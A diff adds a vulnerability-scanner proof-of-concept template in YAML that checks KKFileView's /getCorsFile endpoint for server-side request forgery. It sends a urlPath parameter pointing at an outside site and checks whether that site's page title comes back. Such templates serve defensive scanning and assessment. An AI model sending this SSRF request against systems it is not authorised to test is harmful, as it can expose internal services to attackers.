@@ -1,0 +1,16 @@
+id: poc-yaml-kkfileview-document-online-preview-ssrf
+info:
+  name: KKFileView Document Online Preview SSRF 漏洞
+  severity: high
+  tags:
+  - ssrf
+  finger: KKFileView
+  osprey-id: vb_2021_0060
+requests:
+- method: GET
+  path: /getCorsFile?urlPath=http://www.baidu.com
+  expression: 'status_code == 200 && contains(body, "<title>百度一下，你就知道</title>")
+
+    '
+variables: {}
+transport: http
